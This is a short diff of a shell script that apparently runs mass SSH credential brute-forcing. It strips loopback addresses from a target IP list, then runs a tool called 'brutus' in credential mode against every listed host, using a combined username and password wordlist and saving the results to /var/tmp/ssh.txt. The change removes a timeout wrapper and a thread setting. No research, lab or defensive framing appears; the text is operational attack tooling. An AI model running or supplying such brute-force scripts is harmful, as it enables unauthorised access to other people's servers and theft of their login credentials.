@@ -42,8 +42,11 @@ grep -v "^127\." ips_nabu >  my_ips
 
 
 
-timeout  -k   600s   1s      ./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt   -q -t 50     >     /var/tmp/ssh.txt  
+
+./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q     >     /var/tmp/ssh.txt  
  
+
+
 #600s is 10 min
 
 
